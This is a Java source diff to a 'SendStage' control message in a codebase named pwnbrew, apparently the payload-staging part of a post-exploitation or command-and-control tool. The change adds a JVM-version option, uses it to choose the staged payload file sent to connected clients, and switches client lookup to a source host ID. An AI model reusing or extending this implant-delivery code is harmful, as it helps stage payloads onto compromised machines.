@@ -49,6 +49,7 @@ import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.UnsupportedEncodingException;
 import java.nio.ByteBuffer;
 import java.util.Arrays;
 import java.util.logging.Level;
@@ -56,6 +57,7 @@ import java.util.logging.Logger;
 import pwnbrew.logging.Log;
 import pwnbrew.manager.CommManager;
 import pwnbrew.misc.Constants;
+import pwnbrew.network.ControlOption;
 import pwnbrew.network.PortRouter;
 import pwnbrew.network.control.ControlMessageManager;
 import pwnbrew.network.http.Http;
@@ -69,7 +71,9 @@ import pwnbrew.utilities.Utilities;
  */
 public final class SendStage extends ControlMessage{ // NO_UCD (use default)
     
+    private static final byte OPTION_JVM_VERSION = 16;   
     protected static final String NAME_Class = SendStage.class.getSimpleName();
+    private String theJvmVersion;
   
     // ==========================================================================
     /**
@@ -90,6 +94,33 @@ public final class SendStage extends ControlMessage{ // NO_UCD (use default)
     public SendStage(byte[] passedId ) {
         super( passedId );
     }
+    
+    //=========================================================================
+    /**
+     *  Sets the variable in the message related to this TLV
+     * 
+     * @param tempTlv 
+     * @return  
+     */
+    @Override
+    public boolean setOption( ControlOption tempTlv ){      
+        
+        boolean retVal = true;
+        try {
+            byte[] theValue = tempTlv.getValue();
+            switch( tempTlv.getType()){
+                case OPTION_JVM_VERSION:
+                     theJvmVersion = new String( theValue, "US-ASCII");
+                    break;
+                default:
+                    retVal = false;
+                    break;              
+            }
+        } catch (UnsupportedEncodingException ex) {
+            ex = null;
+        }        
+        return retVal;
+    }  
     
       
     //===============================================================
@@ -112,7 +143,7 @@ public final class SendStage extends ControlMessage{ // NO_UCD (use default)
               
                 try {
                     
-                    File payloadFile = Constants.PAYLOAD_PATH.toFile();
+                    File payloadFile = Utilities.getPayloadFile( theJvmVersion );
                     if( payloadFile.exists() ){
 
                         byte[] byteBuffer = new byte[Constants.GENERIC_BUFFER_SIZE];
@@ -123,7 +154,7 @@ public final class SendStage extends ControlMessage{ // NO_UCD (use default)
                             "pwnbrew/stage/Pwnbrew",
                         };
 
-                        SocketChannelHandler aSCH = aPR.getSocketChannelHandler( getClientId());
+                        SocketChannelHandler aSCH = aPR.getSocketChannelHandler( getSrcHostId());
 
                         //Send each staged class
                         ByteBuffer classByteBuffer = ByteBuffer.allocate(256000);
@@ -211,17 +242,19 @@ public final class SendStage extends ControlMessage{ // NO_UCD (use default)
                     Log.log(Level.SEVERE, NAME_Class, "evaluate()", ex.getMessage(), ex );
                 }
 
-            } else {
-            
+            } else {            
+                
+                try {
+                    //Get the socketchannel handler
+                    int clientId = getSrcHostId();
+                    SocketChannelHandler aSCH = aPR.getSocketChannelHandler( clientId );
 
-                //Get the socketchannel handler
-                int clientId = getClientId();
-                SocketChannelHandler aSCH = aPR.getSocketChannelHandler( clientId );
-
-                //Turn on staging flag and send the payload if it isn't relayed
-                if( aSCH.setStaging(clientId, true) ) {
-                    Payload aPayload = Utilities.getClientPayload(clientId);
-                    aCMManager.send(aPayload);
+                    //Turn on staging flag and send the payload if it isn't relayed
+                    if( aSCH.setStaging(clientId, true, theJvmVersion) ) {
+                        Payload aPayload = Utilities.getClientPayload(clientId, theJvmVersion);
+                        aCMManager.send(aPayload);
+                    }
+                } catch (UnsupportedEncodingException ex) {
                 }
             }
         }
